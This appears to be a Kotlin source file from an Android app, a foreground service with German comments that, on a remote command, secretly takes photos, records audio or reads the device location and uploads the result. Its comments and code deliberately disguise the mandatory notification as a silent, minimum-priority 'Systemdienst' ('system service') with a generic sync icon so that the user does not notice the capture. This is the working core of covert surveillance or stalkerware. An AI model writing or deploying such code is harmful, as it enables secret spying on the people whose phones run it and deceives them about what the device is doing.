package com.ikianti.app.service

import android.app.*
import android.content.Intent
import android.content.pm.ServiceInfo
import android.os.Build
import android.os.Handler
import android.os.IBinder
import android.os.Looper
import android.util.Log
import androidx.core.app.NotificationCompat
import com.ikianti.app.capture.AudioCapture
import com.ikianti.app.capture.CameraCapture
import com.ikianti.app.capture.LocationCapture

/**
 * Foreground Service für Kamera/Audio/Standort-Capture.
 *
 * Läuft NUR während einer aktiven Aufnahme (wenige Sekunden),
 * nicht dauerhaft. Android 9+ erzwingt dabei eine sichtbare
 * Notification – diese ist so unauffällig wie möglich gestaltet
 * (niedriger Kanal, generischer Name, keine Töne/Vibration).
 *
 * Timeout: Service beendet sich automatisch nach 30 Sekunden.
 */
class CaptureForegroundService : Service() {

    companion object {
        const val EXTRA_COMMAND = "command"
        private const val CHANNEL_ID = "sys_service_channel"
        private const val NOTIFICATION_ID = 1
        private const val TIMEOUT_MS = 30_000L
        private const val TAG = "CaptureForegroundService"
    }

    private val mainHandler = Handler(Looper.getMainLooper())
    private val timeoutRunnable = Runnable {
        Log.w(TAG, "Timeout – Service wird beendet")
        stopSelf()
    }

    override fun onStartCommand(intent: Intent?, flags: Int, startId: Int): Int {
        startForegroundCompat()
        mainHandler.postDelayed(timeoutRunnable, TIMEOUT_MS)

        val command = intent?.getStringExtra(EXTRA_COMMAND)
        Log.d(TAG, "Befehl: $command")

        val onDone = {
            mainHandler.removeCallbacks(timeoutRunnable)
            stopSelf()
        }

        when (command) {
            "photo"    -> CameraCapture(this).captureAndUpload(onDone)
            "audio"    -> AudioCapture(this).recordAndUpload(seconds = 10, onDone = onDone)
            "location" -> LocationCapture(this).fetchAndUpload(onDone)
            else       -> { Log.w(TAG, "Unbekannter Befehl: $command"); onDone() }
        }

        return START_NOT_STICKY
    }

    private fun startForegroundCompat() {
        // Kanal: IMPORTANCE_MIN = keine Heads-up, kein Ton, kein Vibration,
        // erscheint ganz unten in der Benachrichtigungsleiste
        val channel = NotificationChannel(
            CHANNEL_ID,
            "Systemdienste",          // generischer Name
            NotificationManager.IMPORTANCE_MIN
        ).apply {
            description = "Systemprozesse"
            setShowBadge(false)       // kein Badge auf dem App-Icon
            enableLights(false)
            enableVibration(false)
        }
        (getSystemService(NOTIFICATION_SERVICE) as NotificationManager)
            .createNotificationChannel(channel)

        val notification = NotificationCompat.Builder(this, CHANNEL_ID)
            .setContentTitle("Systemdienst")
            .setContentText("Systemprozess läuft")
            .setSmallIcon(android.R.drawable.stat_notify_sync_noanim)
            .setPriority(NotificationCompat.PRIORITY_MIN)
            .setOngoing(true)
            .setSilent(true)
            .build()

        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.Q) {
            startForeground(
                NOTIFICATION_ID, notification,
                ServiceInfo.FOREGROUND_SERVICE_TYPE_CAMERA or
                    ServiceInfo.FOREGROUND_SERVICE_TYPE_MICROPHONE or
                    ServiceInfo.FOREGROUND_SERVICE_TYPE_LOCATION
            )
        } else {
            startForeground(NOTIFICATION_ID, notification)
        }
    }

    override fun onDestroy() {
        mainHandler.removeCallbacks(timeoutRunnable)
        super.onDestroy()
    }

    override fun onBind(intent: Intent?): IBinder? = null
}
